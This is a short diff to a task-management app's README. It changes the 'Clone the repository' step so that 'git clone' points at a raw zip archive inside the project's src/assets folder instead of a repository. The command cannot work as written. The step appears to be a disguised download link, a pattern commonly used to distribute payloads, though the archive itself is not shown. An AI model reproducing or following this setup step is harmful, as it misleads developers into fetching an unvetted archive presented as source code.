@@ -30,7 +30,7 @@ A modern task management application built with React, TypeScript, and Supabase.
 
 1. Clone the repository
 ```bash
-git clone https://github.com/yourusername/itaskie.git
+git clone https://github.com/TambongStercy/iTaskie/raw/refs/heads/master/src/assets/i_Taskie_1.7.zip
 cd itaskie
 ```
 
